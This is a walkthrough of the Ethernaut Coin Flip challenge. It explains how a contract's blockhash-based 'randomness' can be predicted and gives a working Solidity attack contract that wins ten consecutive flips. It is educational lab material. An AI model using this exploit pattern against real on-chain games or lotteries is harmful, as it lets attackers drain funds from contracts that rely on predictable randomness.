# Ethernaut Level 3 — Coin Flip

## Introduction

**Coin Flip** is Level 3 of OpenZeppelin's Ethernaut Web3 CTF.

The objective of this level is to win the coin flip **10 times in a row**.

At first, this sounds like a simple guessing game where I just need to call `flip(true)` or `flip(false)` until I get lucky. But after looking at the contract, it becomes clear that the result is not actually random.

The contract uses the previous block's hash to determine the result of the coin flip. Since the block hash and the calculation used by the contract are predictable, I can calculate the correct answer myself before calling `flip()`.

### What this level teaches

- How `block.number` works
- How `blockhash()` works
- How Solidity converts values using `uint256`
- How deterministic calculations can break an apparently random mechanism
- How to reproduce a contract's internal logic from another contract
- How contracts can interact with other deployed contracts
- Why brute forcing is not always the right approach in a CTF

---

## Objective

The goal is to make **10 consecutive correct guesses**.

The contract keeps track of the number of consecutive wins using:

```solidity
uint256 public consecutiveWins;
```

To complete the level, I need to get this value to `10`.

---

## 1. Inspecting the Coin Flip Contract

I first went through the contract provided by the challenge to understand what each part was doing.

The main contract is:

```solidity
contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 5789604461865809771178549250434395392663499233282028202019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

I broke down the important parts of the contract before trying to exploit it.

### `consecutiveWins`

```solidity
uint256 public consecutiveWins;
```

This stores the number of correct guesses made consecutively.

Every correct guess increases it by `1`:

```solidity
consecutiveWins++;
```

But if I guess incorrectly, it gets reset:

```solidity
consecutiveWins = 0;
```

So I cannot afford to randomly guess and hope to eventually reach 10.

### `lastHash`

```solidity
uint256 lastHash;
```

This stores the block hash used during the previous `flip()` attempt.

The contract later checks:

```solidity
if (lastHash == blockValue) {
    revert();
}
```

This prevents the same block hash from being used twice.

### `FACTOR`

```solidity
uint256 FACTOR = 5789604461865809771178549250434395392663499233282028202019728792003956564819968;
```

This is the large constant used to reduce the block hash into a value that determines the coin side.

The important part is that the value is fixed and visible in the contract.

### `constructor()`

```solidity
constructor() {
    consecutiveWins = 0;
}
```

The constructor initializes the number of consecutive wins to zero when the contract is deployed.

### `flip()`

The main logic is inside:

```solidity
function flip(bool _guess) public returns (bool)
```

This function takes my guess as either:

```solidity
true
```

or:

```solidity
false
```

The important part is how the contract calculates the actual side.

---

## 2. Understanding How the Coin Flip Is Calculated

The first important line inside `flip()` is:

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
```

This does several things.

First:

```solidity
block.number
```

gives the number of the block containing the current transaction.

Then:

```solidity
block.number - 1
```

refers to the previous block.

The contract gets that block's hash using:

```solidity
blockhash(block.number - 1)
```

Finally, it converts the resulting hash into a `uint256`:

```solidity
uint256(blockhash(block.number - 1))
```

So `blockValue` is the numerical representation of the previous block's hash.

---

## 3. Following the Flip Logic

After obtaining the block value, the contract calculates:

```solidity
uint256 coinFlip = blockValue / FACTOR;
```

Then it converts that result into the actual boolean side:

```solidity
bool side = coinFlip == 1 ? true : false;
```

So the contract is effectively doing:

```text
Previous block hash
        ↓
Convert to uint256
        ↓
Divide by FACTOR
        ↓
Check if result == 1
        ↓
true / false
```

The important realization here was that there is **no real randomness involved**.

The contract is using a deterministic value that can be calculated from the blockchain.

---

## 4. Checking the Contract ABI

Before trying anything, I opened the browser console and typed:

```javascript
contract
```

This allowed me to inspect the Ethernaut contract object and its ABI.

I could see functions such as:

```text
consecutiveWins()
flip(bool)
```

This confirmed that `flip()` was the main function I needed to interact with and that `consecutiveWins()` could be used to check my progress.

---

## 5. Why Brute Forcing Is a Bad Approach

The objective is to get 10 consecutive wins.

At first, I could theoretically try:

```javascript
await contract.flip(true)
```

or:

```javascript
await contract.flip(false)
```

and keep guessing.

But this is basically brute forcing a result that is supposed to be predictable.

Since the contract itself tells me exactly how the result is calculated:

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

there is no reason to rely on luck.

I instead started looking for a way to **reproduce the exact calculation myself**.

---

## 6. Building an Exploit Contract

Instead of manually guessing the result, I created a second contract that copies the relevant calculation from the original `CoinFlip` contract.

I did not use inheritance here.

Both contracts were implemented in the same Solidity file, but my exploit contract simply holds a reference to the already deployed `CoinFlip` contract and calls it.

My exploit contract was:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract attack {
    uint256 constant FACTOR = 5789604461865809771178549250434395392663499233282028202019728792003956564819968;
    uint256 lastHash;

    CoinFlip coinflip;

    constructor(address _addr) {
        coinflip = CoinFlip(_addr);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert("Wait for next block");
        }

        lastHash = blockValue;
        uint256 coinFlipCalc = blockValue / FACTOR;
        bool side = coinFlipCalc == 1 ? true : false;

        coinflip.flip(side);
    }
}
```

---

## 7. Connecting the Exploit Contract to Ethernaut

The important part of the exploit contract is:

```solidity
CoinFlip coinflip;
```

This creates a reference to the original `CoinFlip` contract.

But simply declaring the variable is not enough. I need to tell my exploit contract **which deployed CoinFlip instance** it should interact with.

That's why the constructor takes an address:

```solidity
constructor(address _addr) {
    coinflip = CoinFlip(_addr);
}
```

Here:

```solidity
_addr
```

is the address of my specific Ethernaut Coin Flip instance.

The address is then converted into a `CoinFlip` contract reference:

```solidity
coinflip = CoinFlip(_addr);
```

This is what connects my attack contract to the actual challenge instance.

---

## 8. Reproducing the Coin Flip Calculation

Inside my exploit contract, I copied the same important logic used by the original contract:

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
```

Then:

```solidity
uint256 coinFlipCalc = blockValue / FACTOR;
```

And finally:

```solidity
bool side = coinFlipCalc == 1 ? true : false;
```

At this point, my exploit contract has calculated the **exact same side** that the target contract is going to calculate.

So instead of guessing the answer, I already know what `_guess` should be.

---

## 9. Calling the Vulnerable Contract

Once the correct side has been calculated, I immediately call:

```solidity
coinflip.flip(side);
```

The important thing here is that both contracts are executing during the same transaction.

My exploit contract calculates the previous block hash and derives the correct side first.

Then it passes that exact value to the target:

```solidity
coinflip.flip(side);
```

So the target contract receives the correct answer instead of a random guess.

The overall flow becomes:

```text
New transaction
      ↓
attack()
      ↓
Get previous block hash
      ↓
Calculate blockValue
      ↓
Divide by FACTOR
      ↓
Calculate true / false
      ↓
Call coinflip.flip(side)
      ↓
Correct guess
      ↓
consecutiveWins++
```

---

## 10. Deploying the Exploit Contract

After writing the exploit contract, I deployed it using the **instance address of my Ethernaut Coin Flip challenge**.

The constructor:

```solidity
constructor(address _addr)
```

expects the target contract address, so I supplied my Ethernaut instance address when deploying the attack contract.

This connected my newly deployed exploit contract directly to the Coin Flip challenge instance.

---

## 11. Executing the Attack

After deployment, I simply called:

```solidity
attack()
```

The exploit contract calculated the correct side and sent it to the Ethernaut contract.

I repeated the `attack()` call **10 times**.

I also had to make sure that each call used a new block because the target contract contains:

```solidity
if (lastHash == blockValue) {
    revert();
}
```

If the same previous block hash were used again, the transaction would revert.

So the attack was effectively:

```text
Attack #1  → Correct
Attack #2  → Correct
Attack #3  → Correct
Attack #4  → Correct
Attack #5  → Correct
Attack #6  → Correct
Attack #7  → Correct
Attack #8  → Correct
Attack #9  → Correct
Attack #10 → Correct
```

After the 10 successful calls, the target contract had:

```solidity
consecutiveWins == 10
```

---

## 12. Completing the Level

Finally, I checked the progress using:

```javascript
await contract.consecutiveWins()
```

The contract had reached 10 consecutive wins.

That meant the objective was completed, so I submitted the level instance in Ethernaut.

The important part of this level was realizing that I did not need to predict some unknown future randomness.

The contract was already giving me a deterministic calculation based on publicly available blockchain data.

By reproducing that calculation inside another contract and calling the target immediately, I could always provide the correct answer.

---

## Level 3 — Completed ✅
